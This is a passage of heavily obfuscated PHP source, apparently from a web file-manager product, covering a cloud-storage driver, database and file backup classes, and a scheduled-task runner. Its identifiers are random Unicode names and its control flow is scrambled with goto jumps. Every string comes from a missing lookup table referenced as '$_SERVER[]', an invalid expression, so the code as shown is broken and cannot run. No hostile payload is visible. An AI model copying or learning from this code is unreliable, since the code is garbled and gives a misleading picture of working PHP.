$d[$cΌ[195]] = $d[$cΌ[196]] = !0; if ($F == $cΌ[33]) { return $d; } goto a롋; a롋: $F = trim($F, $cΌ[8]) . $cΌ[8]; $E = $this->objectMeta($F); if (isset($E[$cΌ[197]])) { $d[$cΌ[194]] = $E[$cΌ[197]]; } goto b; b: } private function fileList($EÐ, $f = '', $E = 0) { goto Cֱφ; F: if (!$B) { return array($DͲ[75] => array(), $DͲ[74] => array()); } $c = $this->listItemCache === !1 ? !1 : !0; $cǤ = $Bݴ = array(); goto C甑; bݴȭ: return array($DͲ[75] => $cǤ, $DͲ[74] => $Bݴ); goto f; Cֱφ: $DͲ =& $_SERVER[]; $d낯 = rtrim($EÐ, $DͲ[8]) . $DͲ[8]; $B = $this->listObjs($d낯, null, null, $f); goto F; C甑: foreach ($B[$DͲ[198]] as $bժ) { goto D; c: $e֙ = $AϤ == 0 && substr($Dͺ, strlen($Dͺ) - 1, 1) == $DͲ[8] ? !0 : !1; if ($c) { $this->cacheMethod($DͲ[199], $Dͺ, $e֙); $this->cacheMethod($DͲ[200], $Dͺ, $bժ); } if ($e֙) { $cǤ[] = $Dͺ; continue; } goto e̵Ơ; e̵Ơ: $Bݴ[] = $E ? $bժ : $Dͺ; goto E; D: $Dͺ = $bժ[$DͲ[28]]; if ($Dͺ == $d낯) { continue; } $AϤ = isset($bժ[$DͲ[78]]) ? $bժ[$DͲ[78]] : 0; goto c; E: } foreach ($B[$DͲ[201]] as $bժ) { $cǤ[] = $bժ[$DͲ[28]]; if ($c) { $this->cacheMethod($DͲ[199], $bժ[$DͲ[28]], !0); } } if ($c) { $this->cacheMethod($DͲ[199], $EÐ, !0); } goto bݴȭ; f: } private function listObjs($fϔ, $AЍǏ = null, $a⊴ = null, $aА = null) { $a =& $_SERVER[]; $fϔ = trim($fϔ, $a[8]); $A = empty($fϔ) && $fϔ !== $a[191] ? $a[33] : $fϔ . $a[8]; return $this->client->getBucket($this->bucket, $A, $AЍǏ, $a⊴, $aА, !0); } public function has($a, $BѢ = false, $D؅ = true) { goto fڃ; fͣ쫙: return !1; goto b; C죬: $A˽񤘪 = $A؍ = array(); while (!0) { $Bӷ̃ = $this->listObjs($a, $eגι, $C, $fژ); if (!$Bӷ̃) { break; } $eגι = $Bӷ̃[$aǚ[202]]; $b = $Bӷ̃[$aǚ[198]]; $A傐ג = $Bӷ̃[$aǚ[201]]; if (empty($b) && empty($A傐ג)) { break; } if (count($b) == 1 && $b[0][$aǚ[28]] == $a) { break; } if ($BѢ) { if (count($b)) { $b = array_column($b, $aǚ[28]); $A˽񤘪 = array_merge($A˽񤘪, $b); } if (count($A傐ג)) { $A傐ג = array_column($A傐ג, $aǚ[28]); $A؍ = array_merge($A؍, $A傐ג); } if ($eגι === null) { break; } continue; } if ($D؅) { if (!empty($b)) { if (count($b) > 1 || isset($b[0][$aǚ[28]]) && $b[0][$aǚ[28]] != $a) { return !0; } } } else { if (!empty($A傐ג)) { return !0; } } if ($eגι === null) { break; } } if ($BѢ) { $A˽񤘪 = array_diff($A˽񤘪, array($a)); $A˽񤘪 = count(array_unique($A˽񤘪)); $A؍ = count(array_unique($A؍)); return array($aǚ[203] => $A˽񤘪, $aǚ[204] => $A؍); } goto fͣ쫙; f: $eגι = null; $C = 500; $fژ = $aǚ[8]; goto C죬; fڃ: $aǚ =& $_SERVER[]; $a = trim($a, $aǚ[8]); $a = empty($a) && $a !== $aǚ[191] ? $aǚ[33] : $a . $aǚ[8]; goto f; b: } public function listAll($A۷) { $Fţ =& $_SERVER[]; $f֌ډ = $this->fileList($A۷, $Fţ[33], !0); $b = array(); foreach ($f֌ډ[$Fţ[74]] as $fĶ˞) { $b[$fĶ˞[$Fţ[28]]] = $fĶ˞[$Fţ[78]]; } foreach ($f֌ډ[$Fţ[75]] as $fĶ˞) { if (is_string($fĶ˞)) { $b[$fĶ˞] = 0; } } return $this->listAllFiles($A۷, array_keys($b), $b); } public function canRead($B) { $bɍ =& $_SERVER[]; $EΓ = $this->client->getAccessControlPolicy($this->bucket, $B); if (!$EΓ) { return !1; } return in_array($EΓ, array($bɍ[205], $bɍ[206], $bɍ[207])) ? !0 : !1; } public function canWrite($f) { $Eғ =& $_SERVER[]; $Fͷ = $this->client->getAccessControlPolicy($this->bucket, $f); if (!$Fͷ) { return !1; } return in_array($Fͷ, array($Eғ[205], $Eғ[206])) ? !0 : !1; } public function getContent($e) { return $this->client->getObject($this->bucket, $e); } public function setContent($cև, $e = '', $fÊ = false) { goto B򨐓; fԓ݂ޑ: $this->cacheMethod(null, null); $cۥÉ = $this->copyFile($cև, $cև, array($d[208] => $cۥÉ[$d[209]])); return $cۥÉ ? !0 : !1; goto C찶; B򨐓: $d =& $_SERVER[]; $cև = $fÊ ? trim($cև, $d[8]) . $d[8] : $cև; $Aؔ = get_file_mime(get_path_ext($cև)); goto F٪; F٪: $cۥÉ = $this->client->putObject($e, $this->bucket, $cև, $d[192], array(), $Aؔ); if (!$cۥÉ) { return !1; } if ($fÊ) { return !0; } goto fԓ݂ޑ; C찶: } public function fileSubstr($B񐧪, $b, $Aς) { $B۽熊 = $b + $Aς - 1; return $this->client->getObject($this->bucket, $B񐧪, array($_SERVER[][210] => "\x62\x79\x74\x65\x73\75{$b}\55{$B۽熊}")); } public function upload($c芿, $E쎆, $E̋긞 = false, $eֿ = REPEAT_REPLACE) { $dȯ =& $_SERVER[]; $c냦 = array($dȯ[208] => @md5_file($E쎆)); $Dǰ = array($dȯ[211] => get_file_mime(get_path_ext($c芿))); if (IO::size($E쎆) <= 1024 * 1024 * 200) { $DǙ = $this->client->putObjectFile($E쎆, $this->bucket, $c芿, $dȯ[192], $c냦, $Dǰ); return !empty($DǙ) ? $this->getPathOuter($c芿) : !1; } $Fӧދ = $this->client->multiUploadObject($E쎆, $this->bucket, trim($c芿, $dȯ[8]), $c냦, $Dǰ); return $Fӧދ ? $this->getPathOuter($c芿) : !1; } public function download($cӕ, $A) { if (!@is_dir($this->pathFather($A)) && !IO::mkdir($this->pathFather($A))) { return !1; } $d = $this->client->getObject($this->bucket, $cӕ, array(), $A); return $d !== !1 ? $A : !1; } public function link($bʠٻ, $E߬ = array()) { $d =& $_SERVER[]; if ($this->signVer == $d[212]) { return $this->client->getAuthenticatedURL($this->bucket, $bʠٻ, 3600 * 12, $E߬); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($bʠٻ, $d[8]), 3600 * 12, $this->region, array(), !0, $E߬); } public function fileOut($c꜏, $dƍ = false, $B읜֯ = false, $b = '') { goto Bݔ֒; Bݔ֒: $dޣ =& $_SERVER[]; if ($this->isFileOutServer()) { return $this->fileOutServer($c꜏, $dƍ, $B읜֯, $b); } if (!$B읜֯) { $B읜֯ = $this->pathThis($c꜏); } goto Dݤ; B: $f = array($dޣ[216] => $dƍ . $dޣ[217] . rawurlencode($B읜֯), $dޣ[218] => $D̢); $b݄ = $this->link($c꜏, $f); $this->fileOutLink($b݄); goto Bݳ; Dݤ: $D̢ = get_file_mime(get_path_ext($B읜֯)); if ($D̢ == $dޣ[213]) { return parent::fileOut($c꜏, $dƍ, $B읜֯, $b); } $dƍ = $dƍ ? $dޣ[214] : $dޣ[215]; goto B; Bݳ: } public function fileOutServer($Fѱ, $BԂ = false, $C = false, $d굙 = '') { parent::fileOut($Fѱ, $BԂ, $C, $d굙); } public function fileOutImageServer($Fķʇ, $a솂 = 250) { parent::fileOutImage($Fķʇ, $a솂); } public function hashMd5($C, $eή珼 = '') { $B =& $_SERVER[]; $D廟뇥 = $this->objectMeta($C); if (!$D廟뇥) { return !1; } $eή珼 = $eή珼 ? $eή珼 : _get($D廟뇥, $B[219]); $eή珼 = $eή珼 ? $eή珼 : _get($D廟뇥, $B[209], $B[33]); return $eή珼; } public function uploadFormData($Cز, $c = 3600) { $a =& $_SERVER[]; $DɊ = $this->pathFather($Cز); $e = $this->client->getHttpUploadPostParams($this->bucket, $DɊ, $a[192], $c); return array_merge((array) $e, array($a[175] => $this->getHost())); } public function multiUploadFormData($C̏ɠô, $c = 3600) { $Fِ =& $_SERVER[]; $dÊ = gmdate($Fِ[220]); $F߉ = array(); $aߏ = $this->client->getUploadId($this->bucket, $C̏ɠô, $F߉); if (!$aߏ) { return !1; } return array($Fِ[221] => $aߏ, $Fِ[175] => $this->getHost() . $Fِ[8] . $this->pathEncode($C̏ɠô), $Fِ[222] => $dÊ, $Fِ[93] => $C̏ɠô); } public function multiUploadAuthData($F, $fى = array()) { goto F; Aݞ: if (strpos($f, $A[225]) === 0) { return array($A[232] => $bˉ, $A[222] => $A); } return $bˉ; goto dњ; a᳑: $b = $fى[$A[93]]; unset($fى[$A[93]]); if (isset($fى[$A[223]])) { $fى[$A[222]] = $A; return $this->listUploadParts($b, $fى); } goto cΥ; F: $A =& $_SERVER[]; $A = isset($fى[$A[222]]) ? $fى[$A[222]] : gmdate($A[220]); $f = isset($fى[$A[168]]) ? $fى[$A[168]] : $A[33]; goto a᳑; cΥ: $bݜ = array($A[224], $A[33], $A[119], $A[33], "\x78\55\x61\155\172\x2d\144\x61\x74\145\x3a{$A}", $A[8] . $this->bucket . $A[8] . $this->pathEncode($b) . $f); if (strpos($f, $A[225]) === 0) { $bݜ[0] = $A[226]; } if (isset($fى[$A[227]]) && $fى[$A[227]] == $A[228]) { $bݜ[0] = $A[228]; } goto fފ; fފ: $c = implode($A[229], $bݜ); $c = base64_encode(hash_hmac($A[230], $c, $this->secret, !0)); $bˉ = $A[231] . $this->accessKey . $A[4] . $c; goto Aݞ; dњ: } public function listUploadParts($Bͩ, $eژ = array()) { goto a힪; cԞŢ: $b߅ = $this->multiUploadAuthData($Bͩ, $eژ); if (empty($b߅)) { return !1; } return array($E[232] => $b߅, $E[222] => $eژ[$E[222]], $E[234] => $d); goto D; f҂ί: if (!$d) { return !1; } unset($eژ[$E[223]], $eژ[$E[227]]); $eژ[$E[93]] = $Bͩ; goto cԞŢ; a힪: $E =& $_SERVER[]; $bƈ = str_replace($E[233], $E[33], $eژ[$E[168]]); $d = $this->client->listParts($this->bucket, $Bͩ, $bƈ); goto f҂ί; D: } public function getHost() { return parent::getHost() . $_SERVER[][8] . $this->bucket; } public function size($eٜ) { $fٿ = $this->objectMeta($eٜ); return $fٿ ? $fٿ[$_SERVER[][78]] : 0; } public function info($a) { if ($this->isFolder($a)) { return $this->folderInfo($a); } else { if ($this->isFile($a)) { return $this->fileInfo($a); } } return !1; } public function exist($f) { return $this->isFile($f) || $this->isFolder($f); } public function isFile($Cփ) { return !$this->isFolder($Cփ) && $this->objectMeta($Cփ); } public function isFolder($Eٱ涵) { return $this->cacheMethod($_SERVER[][199], $Eٱ涵); } protected function objectMeta($bҌ૰) { return $this->cacheMethod($_SERVER[][200], $bҌ૰); } protected function _objectMeta($cЬ귛) { $CΘʊ =& $_SERVER[]; $cЬ귛 = rtrim($cЬ귛, $CΘʊ[8]); try { $E = $this->client->getObjectInfo($this->bucket, $cЬ귛); if (!isset($E[$CΘʊ[219]]) && isset($E[$CΘʊ[235]])) { $E[$CΘʊ[219]] = $E[$CΘʊ[235]]; } } catch (Exception $bۍ) { $E = !1; } if (!$E) { } return $E; } protected function _isFolder($D) { goto fГԚ; e: return !0; goto b҉; fГԚ: $e =& $_SERVER[]; $D = rtrim($D, $e[8]); if ($D == $e[33] || $D == $e[8]) { return !0; } goto E̟Ŏ; E̟Ŏ: $A룗 = $this->client->getBucket($this->bucket, $D, null, 1); if (empty($A룗[$e[198]])) { return !1; } $F͛ = $A룗[$e[198]][0][$e[28]]; goto b; b: return stripos($F͛, $D . $e[8]) === 0 ? !0 : !1; if (substr($F͛, -1) == $e[8]) { return !0; } if (get_path_this($F͛) == get_path_this($D)) { return !1; } goto e; b҉: } } define($_SERVER[][236], 1); goto cК; bڋʌ: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto AɈ; fצȚ: $C = new DbManage($B, $DіȜ); $A뜾ٽ = array($Aಞ탷[742] => $DіȜ, $Aಞ탷[743] => time()); Backup::set($A뜾ٽ); goto a; Fӆ: Backup::set($A뜾ٽ); if ($e > $Dڵ) { write_log(array($Aಞ탷[759], $A뜾ٽ), $Aಞ탷[748]); return !1; } return !0; goto Fݺ; aΗ: if (isset($A권->task[$Aಞ탷[754]])) { $B՗ = $A권->task[$Aಞ탷[754]] ? $A권->task[$Aಞ탷[754]] : timeFloat(); $dȥ = $B՗ - $A권->task[$Aಞ탷[755]]; if ($dȥ >= 0.2) { $e += 1; } } $A권->end(); $A뜾ٽ = array($Aಞ탷[742] => $DіȜ, $Aಞ탷[739] => 1, $Aಞ탷[756] => $e, $Aಞ탷[757] => $Dڵ, $Aಞ탷[758] => time()); goto Fӆ; c: foreach ($aԭ as $F) { $e += $C->model($F)->count(); } $A권 = new Task($Aಞ탷[747], $Aಞ탷[748], $e, LNG($Aಞ탷[749]) . $Aಞ탷[750] . LNG($Aಞ탷[751])); foreach ($aԭ as $F) { $BѴߌ = $A . $F . $Aಞ탷[752]; $b = null; if ($F == $Aಞ탷[753] && (!isset($D˺ԃ[$Aಞ탷[721]]) || $D˺ԃ[$Aಞ탷[721]] == $Aಞ탷[191])) { $b = self::$io; } $Dڵ += $C->sqlFromDb($F, $BѴߌ, $A권, $b); } goto aΗ; a: $A = $this->tmpFilesPath() . $Aಞ탷[744] . self::$name . $Aಞ탷[8]; del_dir($A); mk_dir($A); goto f٦; f٦: $e = $Dڵ = 0; try { $aԭ = $C->db()->getTables(); } catch (Exception $fԝ) { return !1; } $aԭ = array_diff($aԭ, array($Aಞ탷[745], $Aಞ탷[746])); goto c; AɈ: $Aಞ탷 =& $_SERVER[]; $D˺ԃ = Backup::get(); self::$io = $D˺ԃ[$Aಞ탷[718]]; goto a; a: self::$name = $D˺ԃ[$Aಞ탷[28]]; $B = $GLOBALS[$Aಞ탷[6]][$Aಞ탷[17]]; $DіȜ = $this->_dbType($B); goto fצȚ; Fݺ: } private function _dbType($Eׯ) { goto Dﮖ; Cւ: return $E۬; goto Aְ; eׇǔ: if ($E۬ == $a«Ƀ[761]) { $AⷋԂ = explode($a«Ƀ[4], $Eׯ[$a«Ƀ[762]]); $E۬ = $AⷋԂ[0]; } $FĊս = array($a«Ƀ[763] => $a«Ƀ[9], $a«Ƀ[764] => $a«Ƀ[765]); if (isset($FĊս[$E۬])) { $E۬ = $FĊս[$E۬]; } goto Cւ; Dﮖ: $a«Ƀ =& $_SERVER[]; $Eׯ = array_change_key_case($Eׯ); $E۬ = $Eׯ[$a«Ƀ[760]]; goto eׇǔ; Aְ: } private function tmpFilesPath() { $E󜏠 =& $_SERVER[]; $a߈ = TEMP_FILES; if ($GLOBALS[$E󜏠[6]][$E󜏠[88]][$E󜏠[766]]) { $a߈ = $GLOBALS[$E󜏠[6]][$E󜏠[88]][$E󜏠[766]]; if (!mk_dir($a߈) || !is_writable($a߈) || !IO::mkfile($a߈ . $E󜏠[767])) { $a߈ = TEMP_FILES; } } return $a߈; } } class BackupDbFile { public function __construct() { } public function index() { goto Eǂ; cѲ: Backup::set($fؾ); return !0; goto cǞɹ; Eǂ: $aҊƊ =& $_SERVER[]; $cク = Backup::get(); $dʆ = $cク[$aҊƊ[28]]; goto a坷; B: $e؍ = new TaskFileTransfer($aҊƊ[770], $aҊƊ[748], count($eզ), LNG($aҊƊ[749]) . $aҊƊ[440] . LNG($aҊƊ[751]) . $aҊƊ[771]); $e؍->task[$aҊƊ[729]] = $F; foreach ($AĹ[$aҊƊ[74]] as $E·) { $Bó = IO::move($E·[$aҊƊ[76]], $dў); if (!$Bó) { $e؍->end(); $aڥ = IO::getLastError($aҊƊ[772] . $E·[$aҊƊ[76]] . $aҊƊ[773] . $dў . $aҊƊ[504]); write_log($aڥ, $aҊƊ[748]); return !1; } } goto bΉ߽; c: IO::copy($c߆ț, $dў); $e؍->end(); $fؾ = array($aҊƊ[776] => $F, $aҊƊ[777] => time()); goto cѲ; d㑱: $AĹ = IO::listPath($BĬ); $eզ = isset($AĹ[$aҊƊ[74]]) ? $AĹ[$aҊƊ[74]] : array(); $F = array_sum(array_column($eզ, $aҊƊ[78])); goto d͎; bΉ߽: $Fҥ = CONTROLLER_DIR . $aҊƊ[774]; $c߆ț = CONTROLLER_DIR . $aҊƊ[775]; IO::copy($Fҥ, $dў); goto c; d͎: if (!$F) { return !1; } $fؾ = array($aҊƊ[768] => $F, $aҊƊ[769] => time()); Backup::set($fؾ); goto B; a坷: $BĬ = $this->tmpFilesPath() . "\x62\141\x63\153\165\x70\x5f{$dʆ}\57"; $dў = $this->backupPath($cク); if (!($dў = IO::mkdir($dў))) { return !1; } goto d㑱; cǞɹ: } private function backupPath($d鿪) { $B =& $_SERVER[]; $A = $d鿪[$B[28]]; $dʭ = Model($B[736])->get($B[737]); $Cߒ׻ = substr(md5($B[738] . $dʭ . $A), 0, 8); return "\173\x69\x6f\72{$d鿪[$B[718]]}\x7d\x2f\144\x61\164\x61\x62\x61\163\x65\x2f\142\x61\x63\x6b\165\160\x2f" . $A . $B[71] . $Cߒ׻; } private function tmpFilesPath() { $F =& $_SERVER[]; $a˯̜ = TEMP_FILES; if ($GLOBALS[$F[6]][$F[88]][$F[766]]) { $a˯̜ = $GLOBALS[$F[6]][$F[88]][$F[766]]; if (!mk_dir($a˯̜) || !is_writable($a˯̜) || !IO::mkfile($a˯̜ . $F[767])) { $a˯̜ = TEMP_FILES; } } return $a˯̜; } } class BackupFile { public function __construct() { } public function index() { goto fռ谊; eѐ: $C = 1000; $Fȇ = $fᮋٺ = 0; $A֪ = array(); goto a; eľ: $dܼ = (int) Model($_SERVER[][753])->where($bņ)->count($_SERVER[][447]); $c = (int) Model($_SERVER[][753])->where($bņ)->sum($_SERVER[][78]); $Cحܢ = new TaskFileTransfer($_SERVER[][780], $_SERVER[][748], $dܼ, LNG($_SERVER[][749]) . $_SERVER[][750] . LNG($_SERVER[][781])); goto CҜӑ; CҜӑ: $Cحܢ->task[$_SERVER[][729]] = $c; $aɅ = array($_SERVER[][782] => $dܼ, $_SERVER[][783] => $c, $_SERVER[][784] => time()); Backup::set($aɅ); goto Cŋ; E: $this->_fileFilter($A֪); return !0; goto Eǘ缂; fռ谊: $Bގ = Backup::get(); $cʘو = $Bގ[$_SERVER[][291]][$_SERVER[][193]][$_SERVER[][447]]; $bņ = array($_SERVER[][448] => array($_SERVER[][778], $cʘو), $_SERVER[][779] => array($_SERVER[][329], $Bގ[$_SERVER[][718]])); goto eľ; a: $c۲ = $c޷ = 0; do { $CƬ = $_SERVER[][785]; $aӅ = Model($_SERVER[][753])->where($bņ)->field($CƬ)->order($_SERVER[][786])->selectPage($C, $D); $F΢ = !empty($aӅ[$_SERVER[][367]]) ? $aӅ[$_SERVER[][367]] : array(); foreach ($F΢ as $dį㷒) { goto aʶ; e: $Fȇ += $dį㷒[$_SERVER[][78]]; $c޷ += 1; $c۲ += $dį㷒[$_SERVER[][78]]; goto eڍ; aʶ: if (!$this->_fileExist($dį㷒, $A֪, $F)) { $dܼ -= 1; $c -= (int) $dį㷒[$_SERVER[][78]]; write_log("\146\151\x6c\x65\x20\156\x6f\164\x20\145\x78\x69\x73\164\x2e\x66\x69\154\145\x49\104\x3a{$dį㷒[$_SERVER[][447]]}\54\40\160\141\164\x68\72{$dį㷒[$_SERVER[][76]]}", $_SERVER[][787]); continue; } $F龺 = $dį㷒[$_SERVER[][76]]; $c䎳 = "\x7b\x69\x6f\72{$Bގ[$_SERVER[][718]]}\175" . substr($F龺, strlen("\173\151\157\x3a{$dį㷒[$_SERVER[][788]]}\175")); goto A; A: if (IO::exist($c䎳)) { $Cحܢ->updateFileEnd($dį㷒[$_SERVER[][28]], $dį㷒[$_SERVER[][78]]); } else { $c䎳 = get_path_father($c䎳); IO::mkdir($c䎳); if (!IO::copy($F龺, $c䎳, $_SERVER[][789])) { write_log($_SERVER[][790] . $F龺 . $_SERVER[][773] . $c䎳 . $_SERVER[][504], $_SERVER[][748]); $CՆ = !1; break; } } $cʘو = $dį㷒[$_SERVER[][447]]; $fᮋٺ += 1; goto e; eڍ: if ($Fȇ >= 1024 * 1024 * 100) { $aɅ = array($_SERVER[][791] => $cʘو, $_SERVER[][792] => $c޷, $_SERVER[][793] => $c۲); Backup::set($aɅ); $Fȇ = $fᮋٺ = 0; } goto aΠ; aΠ: } $f٬ = count($F΢); $D++; } while ($f٬ == $C); $Cحܢ->end(); goto Fُ; Fُ: $aɅ = array($_SERVER[][794] => 1, $_SERVER[][476] => time(), $_SERVER[][741] => 1, $_SERVER[][791] => $cʘو, $_SERVER[][783] => $c, $_SERVER[][782] => $dܼ, $_SERVER[][795] => time()); if ($fᮋٺ) { $aɅ[$_SERVER[][792]] = $c޷; $aɅ[$_SERVER[][793]] = $c۲; } Backup::set($aɅ); goto E; Cŋ: $CՆ = !0; $F = $this->storeIds(); $D = 1; goto eѐ; Eǘ缂: } private function _fileExist($a, &$B𷋙, $F̊) { goto BÎ; A󇹻: if (!in_array($a[$B[788]], $F̊)) { return !1; } if (IO::exist($EŔ)) { return !0; } $F = get_path_father($EŔ); goto aɏ; BÎ: $B =& $_SERVER[]; $EŔ = $a[$B[76]]; if (in_array($a[$B[447]], $B𷋙)) { return !1; } goto A󇹻; bώԔ: $B𷋙 = array_merge($B𷋙, array_to_keyvalue($b, $B[33], $B[447])); return !1; goto Bن; aɏ: if (IO::exist($F)) { $B𷋙[] = $a[$B[447]]; return !1; } $cԝ = array($B[788] => $a[$B[788]], $B[76] => array($B[380], "{$F}\45")); $b = Model($B[753])->where($cԝ)->field($B[448])->select(); goto bώԔ; Bن: } private function _fileFilter($e͈˽) { $F =& $_SERVER[]; if (empty($e͈˽)) { return; } $e = array($F[447] => array($F[7], array_unique($e͈˽))); $AЭٌ = Model($F[796])->where($e)->field($F[395])->select(); foreach ($AЭٌ as $b) { Model($F[796])->remove($b[$F[395]], !1); } } private function storeIds() { $eʾҖ =& $_SERVER[]; $Dԝ = Model($eʾҖ[733])->listData(); $bԠ = array(); $d﯑ܱ = $GLOBALS[$eʾҖ[6]][$eʾҖ[88]][$eʾҖ[797]]; foreach ($Dԝ as $Eټ) { $d񜞲 = strtolower($Eټ[$eʾҖ[94]]); if (!isset($d﯑ܱ[$d񜞲])) { continue; } $b޼ = $eʾҖ[72] . (isset($d﯑ܱ[$d񜞲]) ? $d﯑ܱ[$d񜞲] : ucfirst($d񜞲)); if (!class_exists($b޼)) { continue; } $bԠ[] = $Eټ[$eʾҖ[393]]; } return $bԠ; } } goto DڱȐ; cК: define($_SERVER[][237], 2); define($_SERVER[][238], 3); define($_SERVER[][239], 1); goto Dۜһ; f͇: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { goto EИŤ; C΂: while (!0) { self::cacheClear(); if (self::valueGet($bܓ[716]) != $bܓ[87]) { self::valueSet($bܓ[1497], $bܓ[191]); self::log($bܓ[1501]); die; } self::valueSet($bܓ[1497], $bܓ[87]); self::valueSet($bܓ[1498], time()); self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } goto b㴅; EИŤ: $bܓ =& $_SERVER[]; if (self::valueGet($bܓ[716]) != $bܓ[87]) { return; } if (self::valueGet($bܓ[1497]) == $bܓ[87]) { $D = self::valueGet($bܓ[1498]); if (time() - $D > self::AUTO_RESTART_TIME) { self::restart(); } return; } goto aǎ; aǎ: http_close(); self::valueSet($bܓ[1497], $bܓ[87]); Hook::bind($bܓ[1499], $bܓ[1500]); goto C΂; b㴅: } public static function restart() { $d =& $_SERVER[]; http_close(); self::valueSet($d[716], $d[191]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet($d[1497], $d[191]); self::valueSet($d[716], $d[87]); } public static function shutdownEvent() { $E =& $_SERVER[]; self::valueSet($E[1497], $E[191]); self::log($E[1502]); } public static function config($d؊О, $Cʸ) { self::valueSet($_SERVER[][716], $d؊О); } private static function taskRunAll() { goto C̰; C̰: $B =& $_SERVER[]; $cݿ = timeFloat(); $Dв = Model($B[1503])->listData(); goto Bǜɉ; Bǜɉ: $F䊫 = count($Dв); for ($Aų = 0; $Aų < $F䊫; $Aų++) { $D٤ = $Dв[$Aų]; if (!$D٤[$B[393]] || $D٤[$B[1504]] != $B[87]) { continue; } if (!self::taskTimeCheck($D٤)) { continue; } self::taskRun($D٤); } Hook::trigger($B[1505]); goto AӬ; AӬ: self::taskQueueRun($cݿ); self::closeDatabase(); goto Aل; Aل: } private static function taskQueueRun($cَ중) { $d = 10; while (!0) { $D = TaskQueue::run(); if ($D === !1) { break; } if (timeFloat() - $cَ중 >= $d) { break; } } } private static function taskTimeCheck($Bז) { goto Dɡ; A֑: $F֢ = strtotime($A[1506] . $F[$A[1507]] . $A[1508]) - strtotime($A[1509]); $c = time() - strtotime(date($A[1510]) . $A[1511]); $AǑ = $c >= $F֢ && $c <= $F֢ + 3600; goto D; D: switch ($F[$A[29]]) { case $A[1512]: if (time() - $D䉦 < 3600 * 24 * 30) { return !1; } if ($F[$A[1512]] == date($A[1513]) && $AǑ) { return !0; } break; case $A[1514]: if (time() - $D䉦 < 3600 * 24 * 7) { return !1; } $A̭ = date($A[1515]) == 0 ? 7 : date($A[1515]); if ($F[$A[1514]] == $A̭ && $AǑ) { return !0; } break; case $A[1507]: if (time() - $D䉦 < 3600 * 24) { return !1; } if ($AǑ) { return !0; } break; case $A[1516]: if (time() - $D䉦 >= floatval($F[$A[1516]]) * 60) { return !0; } break; default: break; } return !1; goto EکȔ; Dɡ: $A =& $_SERVER[]; $F = json_decode($Bז[$A[197]], !0); $D䉦 = intval($Bז[$A[1498]]); goto A֑; EکȔ: } private static function closeDatabase() { goto B; B: $eŮ =& $_SERVER[]; static $d׈ = 0; $FŽ = 1800; goto c۝; Eь: $F = Model($eŮ[502])->db($eŮ[33]); if ($F) { $F->closeConnect(); } if (time() - TIME > 3600 * 24 * 7) { write_log($eŮ[1517], $eŮ[1518]); die; } goto bԯ; c۝: if (!$d׈) { $d׈ = time(); } if (time() - $d׈ < $FŽ) { return; } $d׈ = time(); goto Eь; bԯ: } public static function taskRun($eĎ) { goto e֞; e֞: $e򸔪ڸ =& $_SERVER[]; self::log($e򸔪ڸ[1519] . $eĎ[$e򸔪ڸ[393]] . $e򸔪ڸ[1520] . $eĎ[$e򸔪ڸ[28]] . $e򸔪ڸ[1521] . $eĎ[$e򸔪ڸ[1522]]); Model($e򸔪ڸ[1503])->run($eĎ[$e򸔪ڸ[393]]); goto f; f: $Fޥ = timeFloat(); $FףΙ = $e򸔪ڸ[33]; switch ($eĎ[$e򸔪ڸ[29]]) { case $e򸔪ڸ[305]: $fưʟ = url_request($eĎ[$e򸔪ڸ[1522]], $e򸔪ڸ[228], !1, !1, !1, !1, 10); if ($fưʟ[$e򸔪ڸ[716]]) { $FףΙ = strlen($fưʟ[$e򸔪ڸ[1095]]); } break; case $e򸔪ڸ[227]: $FףΙ = Hook::apply($eĎ[$e򸔪ڸ[1522]]); default: break; } goto Dªٌ; Dªٌ: Model($e򸔪ڸ[1523])->add(array($e򸔪ڸ[1524] => $e򸔪ڸ[33], $e򸔪ڸ[1525] => $e򸔪ڸ[191], $e򸔪ڸ[29] => $e򸔪ڸ[1526] . $eĎ[$e򸔪ڸ[393]], $e򸔪ڸ[1527] => json_encode(array($e򸔪ڸ[28] => $eĎ[$e򸔪ڸ[28]], $e򸔪ڸ[1528] => timeFloat() - $Fޥ, $e򸔪ڸ[291] => $FףΙ)))); self::log($e򸔪ڸ[1529] . $eĎ[$e򸔪ڸ[393]] . $e򸔪ڸ[1530] . $FףΙ); return !0; goto Cˋ; Cˋ: } private static function valueGet($A) { $c =& $_SERVER[]; $d = $c[1531]; $Fͽ = Model($c[1532])->get($A, $d); if (is_null($Fͽ)) { Model($c[1532])->set($c[716], $c[87], $d); Model($c[1532])->set($c[1497], $c[191], $d); $Fͽ = Model($c[1532])->get($A, $d); } return $Fͽ; } private static function valueSet($fê, $c) { $A߫ʫ =& $_SERVER[]; return Model($A߫ʫ[1532])->set($fê, $c, $A߫ʫ[1531]); } protected static function log($Dͱ) { write_log($Dͱ, $_SERVER[][1518]); } private static function cacheClear() { $fڥ =& $_SERVER[]; $F煉 = Model($fڥ[1532])->cacheKey($fڥ[1531]); Cache::clearMemory($F煉); Model($fڥ[1503])->cacheClear(); } } class Task { const STATYS_STOP = "\x73\x74\x6f\160"; const STATYS_RUNNING = "\162\x75\156\x6e\x69\156\x67"; const STATYS_KILL = "\x6b\151\154\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($fۘ, $B = '', $D։ = 0, $Cȿ = '') { goto Dż; dⷍ: $this->startAfter(); Hook::trigger($c̏ĝ[1543], $this->task); $this->task[$c̏ĝ[1536]] = timeFloat(); goto b񒣏; D: $GLOBALS[$c̏ĝ[1539]] = 1; Hook::bind($c̏ĝ[1499], array($this, $c̏ĝ[1540])); Hook::bind($c̏ĝ[1541], array($this, $c̏ĝ[1542])); goto dⷍ; Dż: $c̏ĝ =& $_SERVER[]; if (self::get($fۘ)) { return; } $this->task = array($c̏ĝ[393] => $fۘ, $c̏ĝ[1533] => USER_ID, $c̏ĝ[1439] => $Cȿ, $c̏ĝ[29] => $B, $c̏ĝ[1030] => $c̏ĝ[33], $c̏ĝ[1028] => $D։, $c̏ĝ[1043] => 0, $c̏ĝ[1534] => 0, $c̏ĝ[1535] => 0, $c̏ĝ[755] => timeFloat(), $c̏ĝ[754] => 0, $c̏ĝ[1536] => 0, $c̏ĝ[1537] => 0, $c̏ĝ[1538] => 0, $c̏ĝ[716] => $c̏ĝ[1497]); goto D; b񒣏: } public function end() { goto Eᦙ٘; f: Hook::unbind($Eⷘ[1541], array($this, $Eⷘ[1542])); $this->endAfter(); 